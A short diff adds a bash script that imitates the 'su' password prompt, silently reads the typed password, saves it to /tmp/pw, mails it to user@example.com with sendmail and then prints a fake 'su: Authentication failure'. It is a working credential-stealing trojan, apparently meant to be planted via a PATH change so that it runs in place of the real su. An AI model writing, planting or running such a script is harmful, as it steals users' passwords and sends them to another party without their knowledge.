@@ -1,0 +1,8 @@
+#!/bin/bash
+
+export PATH="/home/ubuntu:$PATH"
+printf "Password: "
+read -s -r PASSWSORD
+echo ${PASSWSORD} > /tmp/pw
+sendmail user@example.com < /tmp/pw
+echo "su: Authentication failure"
